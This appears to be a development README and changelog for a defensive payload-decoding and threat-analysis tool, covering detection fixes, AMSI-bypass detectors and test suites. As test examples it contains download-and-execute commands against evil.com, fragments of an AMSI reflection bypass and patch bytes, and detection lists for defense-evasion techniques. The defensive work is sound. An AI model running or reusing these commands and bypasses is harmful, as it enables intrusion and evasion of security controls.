# NivXRay — Decoder & Threat Analysis Platform


## Latest Change (Feb 2026 — post-deploy fixes)
### MITRE/LOLBAS long-form `-EncodedCommand` + Universal Clear
Bug reports (production, https://nivxray.nivxforge.com):
1. **Threat panels empty for `powershell.exe -EncodedCommand …` payloads** — MITRE, LOLBAS, RULES, IOCs, FLOW all blank; verdict wrongly `LOW RISK · 29/100`.
2. **Clear button** only wiped input, leaving stale output + threat panels + trace visible.

Root causes:
- **Regex bug in `operations.MITRE_HEURISTICS[0]` + `lolbas.CATALOG['powershell.exe']`**: pattern `-e(nc|ncoded)?\s` required whitespace right after the flag → matched `-e `, `-enc `, `-encoded ` but NOT `-EncodedCommand ` (long form has no space between "d" and "Command"). Attackers universally use the long form.
- **`btn-clear-input`** was wired to `setInput("")` — a single-line lambda from an early prototype.

Fixes:
- **New `_PS_ENC_ARG` regex** — nested-optional prefix matcher accepting ALL PowerShell encoded-command variants: `-e`, `-ec`, `-en`, `-enc`, `-enco`, `-encoded`, `-encodedcommand`, and every case-insensitive prefix in between.
- **Added T1027.010** (Command Obfuscation: Base64/Encoded Command) MITRE tag — fires whenever `-Encoded…` is followed by a long b64 blob.
- **Added 7 new MITRE Discovery tags**: T1057 (Get-Process/tasklist), T1007 (Get-Service), T1033 (whoami), T1016 (ipconfig/Get-NetIPAddress), T1087 (net user/Get-LocalUser), T1018 (net view/nbtstat), T1082 (systeminfo/hostname).
- **Added `frombase64string`, `get-process`, `get-service` to LOLBAS powershell.exe pattern** — surfaces PS discovery + b64 decoding as LOLBIN abuse.
- **Universal `clearAll()`** on WorkspacePage — resets 22 state slots + removes `nvx.pendingInput` localStorage safety net.

Validation:
- User's exact payload now returns: MITRE=[T1059.001, T1027.010, T1057], YARA=[PS_EncodedCommand, Base64_Long_Blob], LOLBAS=[powershell.exe], Verdict=Suspicious·44/100 (was Low Risk·29/100).
- 6 new pytest cases in `test_encodedcommand_coverage.py` — covers both short and long form + full-panel integration.
- Full backend suite: **424/424 green** (2m). No regressions.

⚠️ **Deployment note**: All fixes live in **preview** — production (`nivxray.nivxforge.com`) still has the buggy regex until the user redeploys.



## Latest Change (Feb 2026 — this session)
### Chained Wrapper Archetypes + Universal Troubleshoot Engine
- **New `PS_MSF_XOR_Stage2` archetype** — deterministically matches the Metasploit/Meterpreter reflective loader pattern (`[Byte[]]$var_code = FromBase64String + -bxor + reflective-PEB-walker`) and returns raw shellcode bytes.
- **`try_archetypes()` now chains** — Stage-1 output feeds back into the registry (max depth 4), so `PS_MemoryStream_Gzip_IEX → PS_MSF_XOR_Stage2` fires in one call. Engine label becomes `archetype:PS_MemoryStream_Gzip_IEX+PS_MSF_XOR_Stage2` and confidence stays 100%.
- **`analysis_core.deterministic_best_decode()`** now re-checks `reached_shellcode` against the archetype's chained terminal output, so SOC Verdict panel auto-fires on the recovered shellcode bytes.
- **SocVerdictPanel** copy updated to plain-English: `Command & Control (C2) Server` and `Network Masquerading (User-Agent)` — the two IOCs SOC analysts most need.
- **New Universal Troubleshoot Engine (`troubleshoot_engine.py`)** — deterministic-first, AI-optional:
  * Diagnostic codes: EMPTY_INPUT, B64_PAD_FIX, GZIP_TRUNCATED, RECIPE_TOO_SHALLOW, ARCHETYPE_MISSED, OVER_DECODED, GRACEFUL_STOP, MISSING_IOCS, OP_CRASH, LOW_CONFIDENCE, UNKNOWN.
  * Auto-fixes: repairs corrupted base64, deepens shallow recipes, applies missed archetypes, XOR-key sweep for missing IOCs, trims over-decoded tail, escalates low-confidence to magic-decoder.
  * Endpoint `POST /api/troubleshoot/auto?use_ai=<bool>` — deterministic pass always runs; LLM escalation only if `use_ai=true` AND deterministic didn't produce output.
  * Two frontend buttons: `TROUBLESHOOT` (offline) and `TROUBLESHOOT + AI` (with LLM fallback).
- **Tests added**: 5 new tests in `test_wrapper_archetypes.py` (Stage-2 archetype + chained pipeline + real user fixture) + 6 new tests in `test_troubleshoot_engine.py`. **Full suite: 418/418 green** (excluding one pre-existing flaky live-integration test).
- **Live E2E validated** via curl: `/api/decode/smart` on the real Meterpreter fixture returns `engine=archetype:PS_MemoryStream_Gzip_IEX+PS_MSF_XOR_Stage2, confidence=100, reached_shellcode=true, C2=149.28.81.19, UA=Mozilla/5.0(...)MSIE 9.0;Windows NT 6.1;Trident/5.0;BOIE9;PTBR`. `/api/troubleshoot/auto` with a deliberately shallow 1-op recipe auto-fixes to the 5-op chain with the same terminal state, 3 fixes applied, no LLM needed.


## Problem Statement
Build a CyberChef-style tool called **NivXRay** ("like Payload Lab / CyberLab") with:
- 40+ deterministic decoders that work perfectly **without AI**
- AI-powered analysis (Auto Decode, Auto Investigate, Troubleshoot, Describe) via Claude Sonnet 4.5
- OSINT enrichment of extracted IOCs (IP, domain, URL, hash)
- Threat Intelligence / IOC Database with bulk feed sync
- Admin panel to manage OSINT + threat-intel API keys
- LLM Fine-Tuning pipeline for Process Tree Prediction (Feb 2026)
- Rebranded design (dark oxidized-copper aesthetic, distinct from reference NivX Forge screenshots)

## Architecture
- **Backend**: FastAPI + MongoDB (motor async driver) + emergentintegrations (Claude Sonnet 4.5)
- **Frontend**: React + React Router, custom brutalist-technical UI (JetBrains Mono + Chivo)
- **Auth**: JWT (7-day expiry), bcrypt-hashed passwords, admin seeded on startup
- **Deployment**: supervisor (backend:8001, frontend:3000)
- **LLM Training Module (Feb 2026)**: `/app/backend/training/` — canonical process-tree schema, 101 seed archetypes, provider-agnostic exporters (OpenAI/Anthropic/JSONL/CSV/edge-list), strict citation validator

## User Personas
1. **DFIR / SOC Analyst** — triage encoded payloads, extract IOCs, produce reports
2. **Threat Intel Researcher** — sync feeds, cross-reference IOCs, analyze hits
3. **Admin** — manage API keys, users, feed sync

## Core Features (Implemented)
### Workspace (`/`)
- 3-column layout: Operations (left) · Input+Recipe+Output (center) · Threat Analysis (right)
- **45 operations** across Compression / Cryptography / Deobfuscation / Extractors / Formatting / Hashing
- Load-example presets (PowerShell -EncodedCommand, Ransomware Note, Defanged IOCs, Nested Base64→gzip, URL-encoded XSS)
- Toolbar: **Auto Investigate**, **AI Decode**, **Smart Decode** (deterministic), **Run Recipe**, **Troubleshoot**, **Share**, **Report**, **Upload**
- Recipe pipeline builder (reorderable, per-step args)
- Detected payload-type banner
- Analyze + OSINT + AI Describe on Output panel

### Threat Analysis Right Panel (7 tabs)
- MITRE ATT&CK (heuristic mapper — 15 techniques)
- YARA-lite rules (14 built-in rules with severity)
- IOCs (URLs, IPs, domains, emails, MD5/SHA1/SHA256, BTC)
- **TI-HITS** — cross-reference against local Threat-Intel DB
- OSINT (geo, rDNS, VirusTotal, AbuseIPDB, Shodan, GreyNoise, OTX, IPinfo, HybridAnalysis, URLScan)
- AI (verdict + narrative describe: summary, behavior, IOC narrative, attribution hints, actions)
- Chain (decode chain visualization)

### Threat Intelligence (`/threat-intel`)
- Sync 9 curated feeds (bulk): AlienVault OTX, AbuseIPDB, Malwarebytes Labs, Talos, ThreatFox, MalwareBazaar, VirusTotal Enterprise, URLhaus, CINS Army
- 2 lookup-only sources: URLScan.io, Shodan
- Per-source sync status, last-sync timestamps, new/updated counts, total stored
- **Sync all sources** button (admin only)
- **IOC browser** with search + kind/source/severity filters
- Live stats badge (critical / high / medium / low counts by kind)

### Admin (`/admin`)
- Stats cards (Operations, Users, Shared Recipes, OSINT Active, Total IOCs)
- OSINT integrations table (10 services): configure keys, mask on read, test button, remove button
- Users table

### Backend Endpoints (all `/api` prefixed)
- Auth: `/auth/login`, `/auth/me`
- Ops: `/operations`, `/examples`, `/recipe/run`, `/upload`
- Decode: `/decode/smart` (deterministic), `/ai/auto-decode`, `/ai/auto-investigate`, `/ai/troubleshoot`
- Analyze: `/analyze` (returns iocs, mitre, yara, risk, osint, ti_hits, ai_verdict, description)
- Share/Report: `/share`, `/share/{token}`, `/report`
- Threat Intel: `/threat-intel/sources`, `/threat-intel/stats`, `/threat-intel/sync/{id}`, `/threat-intel/sync-all`, `/threat-intel/iocs`, `/threat-intel/lookup/{value}`
- Admin: `/admin/osint/services`, `/admin/osint/settings`, `/admin/osint/test/{id}`, `/admin/users`, `/admin/stats`

## Design System
- Palette: `#101112` bg, `#18191b` surface, `#4AA890` oxidized copper accent, `#E27E5D` phosphor rust warn, `#D96C6C` high, `#C0CA33` low
- Fonts: **Chivo** (display) + **JetBrains Mono** (body/code)
- Brutalist: 1px sharp borders, no radius, layered inset backgrounds, subtle noise overlay

## Session Log
- **2026-01 · Session 1**: MVP complete — decoders, AI, OSINT, admin, threat-intel, rebrand to NIVXRAY.

## Backlog / Future Work
- P1: Real-time WebSocket streaming for LLM `describe` output
- P1: More YARA/MITRE rules
- P2: User management (invite / password reset / role editing) in Admin
- P2: Scheduled auto-sync of threat-intel feeds (cron)
- P2: Export IOCs (STIX 2.1 / MISP / CSV)
- P2: Threat-intel graph visualization (react-force-graph-2d)
- P3: Multi-tenant workspaces

## Session 2 (2026-01) — Deep Analytics
- Added **LOLBAS matcher** — 40 curated LOLBAS entries (certutil, mshta, rundll32, powershell, cmd, etc.) with argv-context detection + MITRE tagging + doc links
- Added **AI-driven MITRE mapping** with evidence citation, merged with heuristic hits (source badge shown)
- Added **Malware family attribution** (name + confidence + rationale) surfaced prominently in AI tab
- Added **Behavior Flow Graph** — AI-produced node/edge graph (start | filesystem | network | crypto | execution | persistence | discovery | c2 | impact | end), rendered on a canvas-based `FlowGraph` component
- Added **Universal file upload** — accepts ANY file format (PE, ELF, PDF, ZIP, Office, images, scripts). Returns MD5/SHA1/SHA256, magic-byte file-type detection, hex-dump preview, extracted strings ≥4 chars
- Added **Multi-format report export**: TXT · HTML · CSV · DOCX · PDF (native styling). All 5 verified downloadable end-to-end via `/api/report/{fmt}`.
- New backend modules: `lolbas.py`, updated `smart_decoder.py` (embedded-base64 blob extraction), extended `server.py` report renderers (`_render_text_report`, `_render_html_report`, `_render_csv_report`, `_render_docx_report`, `_render_pdf_from_html`)
- Frontend: new `FlowGraph.jsx`, `ReportMenu.jsx`, new tabs in `ThreatAnalysis.jsx` (LOLBAS, FLOW)
- Dependencies added: `python-docx==1.1.2`, `xhtml2pdf==0.2.16` (with `reportlab`), `react-force-graph-2d`

## Session 3 (2026-02) — Multi-line PS/Base64 Decoder Fix
- **Fixed** `powershell-encoded` operation in `/app/backend/operations.py`: now joins all input lines into a single string, strips all newlines/whitespace and non-base64 chars from the payload, auto-pads, and always decodes as **UTF-16LE** (PowerShell standard) with `errors="ignore"`.
- **Fixed** `base64-decode` operation: now auto-pads missing `=` characters and reliably handles multi-line/whitespace-broken base64 pastes.
- **Fixed** `_PS_ENCODED_RE` in `/app/backend/smart_decoder.py` to accept whitespace inside the captured base64 group `[A-Za-z0-9+/=\s]{16,}` — multi-line PS-encoded payloads are now detected by Smart Decode.
- **Fixed** smart_decoder's PS-encoded branch to strip whitespace and force UTF-16LE decoding.
- Regression tested via testing agent: **46/46 backend pytest tests pass** (27 new multi-line coverage tests added under `/app/backend/tests/test_multiline_decode.py`).
- Test-side fix: stale credential typo (`nivxary` → `nivxray`) in `test_nivxary.py` corrected.

## Session 4 (2026-02) — Streaming, LOLBAS Auto-Sync, Attack Graph Filter, Final Summary
- **P1 · Async job pipeline for AI-heavy runs** — new `/api/analyze/async` + `/api/analyze/status/{job_id}` pair replaces the SSE approach for Auto-Investigate (K8s ingress kills SSE at ~60s regardless of heartbeats). Background asyncio task fills progress from 5% → 25% → 45% → 90% → 100%; jobs stored in-memory with 15-min TTL. Frontend polls every 3s and cleanly bypasses the proxy timeout. `/api/analyze/stream` SSE endpoint kept for future short-run streaming use.
- **P2 · LOLBAS auto-sync** — `/app/backend/lolbas.py` rewritten to fetch the full **239-entry** official catalog from `https://lolbas-project.github.io/api/lolbas.json`, cache in MongoDB `lolbas_cache`, merge with **40 curated argv-pattern rules** (defaults win on binary-name conflict). Auto-refreshes on backend startup if last sync is >7 days old. Failure preserves last-good cache. New admin endpoints: `GET /admin/lolbas/status`, `POST /admin/lolbas/sync`. Admin UI card added.
- **P3 · Click-to-filter on Tactical Attack Graph** — clicking a lane header or node in the graph sets a tactic filter that dims other lanes/nodes/edges AND filters MITRE + LOLBAS tabs in the Threat Analysis panel. Filter badge in the AG card head and a banner in the Threat Analysis panel, both with a **CLEAR** button.
- **Final Summary card** below the Attack Graph — consolidates malware family, executive summary, attack chain, observed behavior, IOC narrative, attribution hints, and recommended actions. **COPY** + **DOWNLOAD TXT** buttons.
- **Attack Graph snapshots** — PNG (2x hi-DPI, canvas-rendered) and SVG native downloads directly from the graph toolbar.
- Regression: **57/57 backend pytest tests pass** (11 new coverage tests in `test_new_features.py`). Auto-Investigate end-to-end verified in ~56-78s with all cards, filters, and downloads working.

## Session 5 (2026-02) — Weaponized Decoding + Training Studio
- **+42 operations** — total now **87**. Adds AES-CBC/GCM/ECB, DES/3DES-CBC, RC4, ChaCha20, HMAC-SHA1/256/512/MD5, PBKDF2-SHA256, SHA3-256/512, MD4, RIPEMD-160, bzip2/LZMA/LZ4 decompress, UTF-16BE/UTF-32/CP1252/ASCII85/Base85 codecs, JWT decode/verify, ASN.1/DER parse, MessagePack, JSON diff, PE-header parse, PE-strings extract, ELF-header parse, PDF header sniff, file-magic byte identifier, JS beautify, JS `\x`-escape decoder, printable-ratio / Shannon-entropy / byte-frequency utilities.
- **Magic Recursive Auto-Decoder** (`POST /api/decode/magic`) — CyberChef "Magic" parity.
- **Automated payload sanitizer** — the "isolate the payload string first" thumb rule. Strips PowerShell/Bash wrappers before decode.
- **Known-signature auto-chain** — H4sIA→gzip, JAB/SQBFAF→UTF-16LE PowerShell, TVq→PE, etc.
- **Recipe URL sharing** — `#recipe=<base64>` restores input + steps.
- **Model Studio 5th kind → `playbook`** — free-form analyst training text auto-appended to every AI investigation.
- **NivX Cognis** — flagship in-house AI persona, auto-selected in the Workspace picker.

## Session 6 (2026-02) — Malware Sample Library + Continuous Benchmark
- **Sample Library** (`/app/backend/sample_library.py`) — MongoDB-backed collection storing real-world encoded payloads + expected decoded outputs + categories + MITRE + IOC labels.
- **12 categories** with per-category coverage tracking: PowerShell, CMD, Bash, Python, JavaScript, .NET, LOLBAS, Malware Family, Compression, Crypto, Multi-stage, Living-off-the-Land.
- **15 built-in seed samples** covering canonical PS -EncodedCommand, multi-line base64, Python b64decode wrapper, nested base64, hex, XOR shellcode declaration, gzip (H4sIA), zlib, LZMA, JWT, JS atob, bash base64 -d, CMD caret obfuscation, LOLBAS certutil, and a redacted Lumma stealer stub.
- **Endpoints**: `/api/admin/samples` (list · CRUD · bulk import · dashboard), `/api/admin/samples/{id}/benchmark`, `/api/admin/samples/benchmark/all`.
- **Benchmark logic** — runs both **Smart Decoder** and **Magic Decoder** against every sample, scores pass/fail by expected-output substring match, produces per-category coverage report.
- **Nightly benchmark cron** — asyncio background task runs `benchmark_all` every 24h and persists results in `benchmark_runs` collection for historical tracking.
- **Frontend** (`/app/frontend/src/pages/SampleLibraryPage.jsx`) — full CRUD UI, color-coded coverage dashboard (green ≥95% / orange ≥70% / red <70%), inline expand for raw/expected/notes, per-row + all-samples BENCH buttons, JSON bulk import.
- **Header + Admin quick-link nav** to `/admin/samples`.
- Initial benchmark on seeded samples: **10/15 pass (66.7%)** — exposes real decoder gaps for follow-up work (LZMA / Zlib / H4sIA-gzip auto-chain / JWT / JS atob).
- Regression: **57/57 backend pytest pass**.

## Session 9 (2026-02) — Phase-2: PowerShell AST deobfuscation + AMSI bypass detection

### PowerShell AST-lite deobfuscator (`/app/backend/powershell_ast.py`)
Pattern-based mini-AST — multi-pass so each transformation feeds the next:
- **Variable-assignment tracking**: `$a="I";$b="EX";$c=$a+$b` → `$c='IEX'` (first-assignment-wins scoping). Skips substitutions inside string literals so `"($var)"` stays intact.
- **String concatenation**: `'i'+'e'+'x'` → `'iex'` (single-quote body escape `''` respected, double-quote `\"` unescape).
- **Format-string obfuscation**: `"{2}{0}{1}" -f 'B','C','A'` → `'ABC'`.
- **.Replace() char substitution**: `('IZEZX').Replace('Z','')` → `'IEX'` (multi-pass — up to 5 chained `.Replace()`).
- **[char]N literal**: `[char]73+[char]69+[char]88` → `'IEX'`.
- **Backtick escapes**: `` i`e`x `` → `iex`.
- **Case normalization** for known cmdlets (`InVOkE-eXpReSsION` → `Invoke-Expression`) so signature matchers downstream fire reliably.
Returns `{output, transformations:[{kind, before, after, detail}], bindings}` — analysts can audit every change.

### AMSI-bypass detector (`/app/backend/amsi_detector.py`)
Signature bank of 15 patterns across 3 categories (`amsi`, `reflection`, `etw`):
- Direct references: `System.Management.Automation.AmsiUtils`, `amsiInitFailed`, `AmsiScanBuffer*`, `AmsiContext/Session`
- Reflection bypasses: `GetField('amsiInitFailed',...)`, `SetValue($null,$true)` on AmsiUtils, `[Ref].Assembly.GetType(...)`
- Byte-patch classics: Metsysbench (`0xB8,0x57,0x00,0x07,0x80,0xC3`), `xor eax,eax; ret` (`0x31,0xC0,0xC3`)
- Memory helpers: `VirtualProtect` near AMSI region, `LoadLibrary('amsi.dll')`
- ETW: `EtwEventWrite`, `System.Diagnostics.Eventing`
- Known bypass phrasing: Nishang-style, Mattifestation/matt.graeber pattern
Returns `{detected, severity, techniques[], amsi_related_count, etw_related_count}` — severity auto-tiers on match count + confidence (critical/high/medium/low).

### Integration into ICAE (`command_analyzer.py`)
- AST runs on the raw command AND every decoded layer when PowerShell markers are present (`$var=`, `[Convert]::`, `[char]N`, `-bxor`, `-f 'a'`, `.Replace(`, backticks) — no need for explicit `powershell.exe` prefix.
- AMSI scan runs on the union of raw + all decoded + AST-normalized text — **catches bypasses hidden inside `-Enc` base64 wrappers**.
- MITRE mapping auto-adds T1562.001 (Impair Defenses: Disable Tools) and T1562.006 (Indicator Blocking) with dedup.
- Behaviors tag `amsi-bypass` (severity in detail) when detected.
- Response now includes `ast_deobfuscation` + `amsi_bypass` blocks.

### Frontend (`CommandAnalyzerPage.jsx`)
- **AST DEOBFUSCATION** panel — variable-binding chips + transformation timeline + final deobfuscated output.
- **AMSI / DEFENSE-EVASION** panel — severity badge, AMSI/ETW counts, per-technique cards with MITRE ID, confidence bar, evidence snippet.
- Two new example chips: "PS variable+concat obfuscation" and "AMSI reflection bypass".

### Regression: **139/139 pytest** (adds 18 new: PS AST + AMSI). Sample Library benchmark still **17/17 = 100%**.

### End-to-end proof (visual, see attached screenshots)
1. Obfuscated PS `$a='I';$b='E';$c='X'; & ($a+$b+$c) ([Ref].Assembly.GetType(...AmsiUtils')...SetValue($null,$true))` — AST resolves bindings, AMSI panel lists 7 techniques (critical).
2. Same AMSI bypass **wrapped in base64 -Enc** — pipeline decodes `base64→utf16le` first, THEN detects all 7 AMSI techniques from the revealed content. Inline reconstruction shows the deobfuscated content next to the original -Enc blob.

## Backlog (P1/P2 remaining)
- P1: Client-side WASM ops for real-time preview.
- P1: Live diff-highlight between INPUT & OUTPUT columns.
- P2: PE / ELF loader (parse imports, section table) — extends shellcode_analyzer.
- P2: Modularize `/app/backend/server.py` into routers.
- P2: STIX 2.1 export + community share page.

## Session 8 (2026-02) — Intelligent Command-Line Analysis Engine (ICAE)

- **New module** `/app/backend/command_analyzer.py` — execution-aware command-line semantic engine.
  - Interpreter registry: `powershell`, `cmd`, `bash`, `python`, `javascript` (node/deno), `mshta`, `rundll32`, `regsvr32`, `certutil`, `wscript`/`cscript`, `msiexec`, `curl`/`wget`, `bitsadmin`. Each profile encodes `payload_flags` (values are inline payloads to decode) and `file_operand_flags` (values are FILES — never decode).
  - Shell-aware `split_pipeline()` (respects quoted strings, handles `|`, `&&`, `||`, `;`, `>` connectors) + `tokenize()` with a POSIX/Windows shlex fallback.
  - `_find_payload_spans()` scans tokens for encoded regions with per-span confidence: PS `-Enc`/`-EncodedCommand` value → 0.98, `[Convert]::FromBase64String("…")` → 0.95, `atob("…")` / `base64.b64decode("…")` → 0.95, unicode-escape → 0.85, chr()+chr() concat → 0.80, URL-encoded → 0.75, standalone long base64 → 0.72, long hex → 0.60.
  - **Confidence gate**: auto-decode only ≥0.80. Multiple candidates tied within 0.05 → `needs_choice:true` + `choice_reason`. Frontend prompts the analyst to pick.
  - **Never decode file operands**: `certutil -decode input.b64 output.exe` correctly returns `identified_payloads: []` + behavior `file-decode`.
  - **Execution-flow classifier** `classify_behaviors()` — tags: `network-fetch`, `in-memory-execute`, `download-and-execute` (pipeline: downloader → interpreter), `persistence`, `file-decode`, `stealth-flags`.
  - `_decode_span()` runs the span through smart_decode + magic_decode, filters out empty-chain candidates, picks the highest-scoring non-trivial chain, and preserves the shellcode-stop flag.
  - Unified `extract_iocs()` (URLs, IPs, domains, file paths, reg-keys, MD5/SHA1/SHA256) and `map_mitre()` with deduped rules (T1027, T1059.001, T1105, T1140, T1218.005/010/011, T1071.001, T1053.005, T1197, …).
  - `reconstruct_inline()` renders the original command with each decoded span annotated as `«decoded: …»` — preserves syntax so analysts can visually diff obfuscated vs decoded.
  - `summarize()` produces the analyst behavior brief.
- **New endpoint** `POST /api/analyze/command` — payload `{input, force_decode_span?}`. Returns `{original_command, parsed_structure, identified_payloads, needs_choice, choice_reason, decode_chains, final_decoded_inline, iocs, lolbins, mitre, behaviors, behavior_summary, raw_tokens}`.
- **New page** `/analyze` — "COMMAND ANALYZER" nav tab. Renders parsed structure, identified payloads with confidence bars + reason, decode chains with inline shellcode view, IOCs / LOLBins / MITRE panels, behavior summary. `needs_choice` surfaces an in-app picker for tied payloads.
- **New features in ops_extended**: `env-expand` (%TEMP% / $env:APPDATA / ${HOME} / ~/ → canonical placeholder paths) + `xor-brute` (Kasiski + English-scoring, up to 32-byte repeating keys, Occam-shave prefers shorter keys). Integrated into smart_decoder (post-decode env-expand) and magic_decoder (xor-brute candidate for high-entropy buffers).
- **ShellcodeView wired into `/decode/magic` modal**: each candidate flagged `is_shellcode:true` shows an inline `🔬 ANALYZE BINARY` toggle that expands Capstone disassembly + IOC panel inside the modal.
- Regression: **121/121** pytest pass (adds 22 shellcode + 28 command-analyzer). Malware Sample Library benchmark still **17/17 = 100.0%**.

### End-to-end proof (all four scenarios from the design brief)
1. `powershell.exe -NoP -W Hidden -Enc SQBF…` → auto-decodes to `IEX (New-Object Net.WebClient).DownloadString("http://evil.com/x.ps1")`, MITRE T1059.001 + T1105 + T1071.001.
2. `powershell -c "[Convert]::FromBase64String('aGVsbG8gd29ybGQ=')"` → `needs_choice` (0.98 vs 0.95). Force-decode returns `hello world`.
3. `certutil -decode input.b64 output.exe` → **zero** inline decodes attempted. Flagged as `file-decode` LOLBin, MITRE T1140.
4. `curl http://evil.com/payload.ps1 | powershell` → NO base64 hallucination. Behaviors `network-fetch` + `download-and-execute`, MITRE T1071.001, URL extracted.

## Session 7 (2026-02) — Benchmark 100% + Playbook Feedback Loop + Recursive Decode-and-Route

### Sub-session A · Benchmark 100% (Compression + JWT + JS atob patch)
- **Compression samples fixed** — regenerated valid base64+gzip / base64+zlib / base64+lzma raw_input blobs and added a new `Bzip2-compressed base64` seed (17 built-in samples).
- **Sanitizer** — `sanitize_encapsulated_payload` short-circuits JWT-shaped inputs so `jwt-decode` sees the whole token.
- **Smart decoder** — after sanitizer isolation, eagerly base64-decodes + applies compression-magic fast-path (gzip/zlib/lzma/bzip2 via shared `_bin_magic_op`).
- **Signature registry** — added zlib (`^e[AFJN]`), LZMA (`^/Td6WFo`), bzip2 (`^QlpoO`) base64-prefix signatures.
- **Seed-refresh** — `seed_builtins` updates protected built-ins in place when data diverges. Benchmark: **17/17 = 100.0%**.

### Sub-session B · Playbook feedback loop (👍/👎 with audit trail)
- `record_playbook_vote()` in `models_studio.py` — toggle-aware, reverses previous vote counters before applying new one. Full audit trail appended to `playbook_votes.history`.
- New collection `playbook_votes` with unique index `(job_id, analyst_email)`.
- Endpoints: `POST/GET /api/analyze/{job_id}/feedback`, `GET /api/admin/playbooks/{id}/votes`.
- Auto-boost: `get_active_playbooks` sorts by `feedback_weight = pos − neg` DESC, falls back to `usage_count`.
- Frontend: `PlaybookFeedback` widget on Final Summary card + Threat Analysis header, `PlaybookScorecard` badge on Model Studio playbook cards.
- **NOTE**: End-to-end backend testing agent timed out during a long AI-dependent flow; feedback endpoints smoke-tested manually (up→down→none, counters + audit correct). Fast unit tests in `tests/test_playbook_feedback.py` (needs `-n 0` to skip serialised AI polls).

### Sub-session C · Recursive Decode-and-Route pipeline
- **XOR key parser** in `payload_sanitizer.py` — `find_xor_key()` regex-extracts `-bxor 35`, `-bxor 0x2A`, `-bxor 'A'`, `^ 0x35`, `xor eax, 0x…`, `xor byte ptr [rax], 0x…` patterns.
- **Multi-stage span extraction** — `find_all_base64_spans()` re-scans the current text (after each decode) for a *second* `FromBase64String("…")` and isolates it, avoiding infinite base64→base64 loops via the `looks_wrapped` guard.
- **Magic decoder** — now threads a `ctx` (parsed XOR key etc.) through the recursive walk. When it sees a clean-base64 buffer AND a parent layer supplied a key, it plans the deterministic `base64-decode → xor(key)` chain. Chain-completion bonus surfaces fully-decoded chains above intermediate stopping points.
- **Shellcode stop-condition** — new `shellcode_analyzer.py` module: `shannon_entropy`, `is_shellcode` (entropy + prologue heuristics for MSFVenom / Cobalt-Strike / MZ / ELF / Mach-O / ARM64), `detect_arch` (auto x86 / x86_64 / ARM / Thumb / ARM64 via Capstone coverage scoring), `disassemble` (Capstone listing with addr / hex / mnemonic / operands), `extract_iocs` (URLs, IPs, domains, MD5/SHA1/SHA256, reg-keys, mutexes, API imports).
- **New API**: `POST /api/analyze/shellcode` — accepts hex / base64 / utf-8; returns arch + entropy + disassembly + IOCs. Manual arch override supported.
- **New frontend**: `ShellcodeView.jsx` auto-renders below the workspace output when the magic decoder flags `is_shellcode: true`. Arch selector (AUTO / x86_64 / x86 / ARM64 / ARM / THUMB), hex preview, live disassembly table, collapsible IOC panel.
- **Dependency**: added `capstone==5.0.9`. Regression: **71/71 pytest pass** (excluding the AI-dependent feedback loop suite) + **22/22 new pipeline tests** in `tests/test_shellcode_pipeline.py`.
- **End-to-end proof**: Cobalt-Strike-style payload `base64(gzip(script containing base64('xor 35')))` decodes to `echo COBALT_STAGER_UNMASKED` in the #1 chain (score 0.65, all 5 ops chained deterministically). MSF x64 stager `fc4883e4f0e8…` auto-detects as x86_64, correctly disassembles to `cld; and rsp, -16; call …`.
- **+42 operations** — total now **87**. Adds AES-CBC/GCM/ECB, DES/3DES-CBC, RC4, ChaCha20, HMAC-SHA1/256/512/MD5, PBKDF2-SHA256, SHA3-256/512, MD4, RIPEMD-160, bzip2/LZMA/LZ4 decompress, UTF-16BE/UTF-32/CP1252/ASCII85/Base85 codecs, JWT decode/verify, ASN.1/DER parse, MessagePack, JSON diff, PE-header parse, PE-strings extract, ELF-header parse, PDF header sniff, file-magic byte identifier, JS beautify, JS `\x`-escape decoder, printable-ratio / Shannon-entropy / byte-frequency utilities. (`/app/backend/ops_extended.py`)
- **Magic Recursive Auto-Decoder** (`POST /api/decode/magic`) — CyberChef "Magic" parity. Tries every plausible op, scores each output (printable + English + entropy + structure signatures), and returns the top-N chains. UI: MAGIC button + modal with per-candidate scores/reasons + APPLY CHAIN.
- **Automated payload sanitizer** (`/app/backend/payload_sanitizer.py`) — the "isolate the payload string first" thumb rule. Strips PowerShell/Bash wrappers (`[System.Convert]::FromBase64String`, `[Byte[]]$var_code`, `-EncodedCommand`, `echo …| base64 -d`, brackets, `$vars`) and extracts the longest base64/hex payload from inside quotes. Wired into `base64-decode`, `powershell-encoded`, `smart_decode`, `magic_decode`.
- **Known-signature auto-chain** (`/app/backend/signatures.py`) — recognized base64 prefixes: H4sIA→gzip, JAB/SQBFAF→UTF-16LE PowerShell, TVq→PE, UEsD→ZIP, JVBER→PDF, f0VMRg→ELF, plus XOR-loop key sniffer. Sourced from Sophos Cobalt-Strike teardowns.
- **Recipe URL sharing** — `#recipe=<base64>` URL loads input + recipe on next visit. `COPY LINK` button on the toolbar.
- **Model Studio 5th kind → `playbook`** — free-form analyst training text auto-appended to every AI investigation. Seeded with a **Malicious PowerShell Decoder Playbook** (Sophos-style layered stager rules + MITRE mappings) and a **LOLBAS Triage Guidance** playbook.
- **NivX Cognis** — the flagship in-house AI persona, auto-selected in the Workspace picker. Trained on the Sophos layered-stager decoder + MITRE + LOLBAS pipeline. Uses Claude Sonnet 4.5 by default (via Emergent Universal LLM Key).
- Regression: **57/57 backend pytest pass**.



### Sub-session D · 190-sample strict pre-deploy regression gate (Feb 2026)
Built `tests/test_regression_150plus.py` — 190 parametrized tests covering 20 categories: Base64 flat/nested (double/triple/quad), UTF-16LE PS-Enc, gzip/zlib/LZMA/bzip2 wrappers, base64+single-byte XOR, hex, PowerShell AST deobfuscation, AMSI bypass patterns, LOLBin detection, shellcode extraction + Capstone disassembly, IOC extraction (URLs/IPs/hashes/domains/regkey/paths), MITRE ATT&CK mapping, env-var expansion, tokenizer/pipeline edge cases, malformed/hostile input, and multi-stage recursive end-to-end pipelines.

Real product bugs uncovered & fixed under the strict gate:
1. **`magic_decoder.py` byte-preservation extension** — Preserved XOR key from the **original wrapper text** before `sanitize_encapsulated_payload` strips it. Previously, PowerShell wrappers like `$c=[Convert]::FromBase64String("…"); … -bxor 35` lost the key on isolation, so the deterministic `base64→xor` chain never fired. Only worked for meterpreter-style stagers where the key was inside the *decompressed* gzip layer.
2. **`magic_decoder.py`** — Prioritised `hex-decode` when input is unambiguously hex (only 0-9a-f). Previously outranked by base64/utf16 speculation under tight `max_branches` budgets.
3. **`magic_decoder.py`** — Added *still-encoded-output* guard on the chain-completion bonus. Deeply-nested chains that produced pure hex/base64 output were artificially boosted above short readable answers (e.g. `Cobalt Strike stager` was outranked by a 7-op hex-mangling chain).
